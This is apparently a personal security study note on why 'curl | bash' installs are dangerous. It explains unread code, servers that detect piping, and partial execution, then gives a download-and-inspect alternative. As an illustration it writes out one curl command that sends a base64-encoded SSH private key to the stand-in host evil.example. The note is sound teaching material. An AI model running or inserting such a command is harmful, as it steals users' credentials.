# Why `curl ... | bash` is dangerous

> Category: security
> Date: 2026-06-19
> Related: SC exam (supply chain security, integrity verification, least privilege)

## What it does

curl -fsSL https://example.com/install.sh | bash

Downloads a script from the internet and executes it immediately, without ever reading the contents.

## Why it's dangerous

### 1. You execute code you haven't read, with your own privileges

Any line hidden in the install script runs with your user permissions.
Example: this line could be buried inside and you'd never see it:

curl -s "https://evil.example/c?d=$(cat ~/.ssh/id_rsa | base64)"

This silently sends your SSH private key to an attacker's server while pretending to install something.

### 2. The server can serve different content to readers vs. executors

Even if you curl the script first to inspect it, a malicious server can detect
that the second request is piped to bash and serve a different, malicious version.
"I read it first" does not guarantee safety.

### 3. Partial execution if the connection drops

The pipe executes lines as they arrive. If the download is interrupted mid-way,
a broken or partial command may still run.

## The safe approach

curl -fsSL https://example.com/install.sh -o install.sh
less install.sh
bash install.sh

Better yet: use a verified package manager like Homebrew.
This is why we used `brew install fnm` instead of the official curl|bash method.

## Connection to SC exam

- Supply chain security (can you trust the source?)
- Integrity verification (hash/signature checking)
- Least privilege (don't run unverified code with elevated permissions)
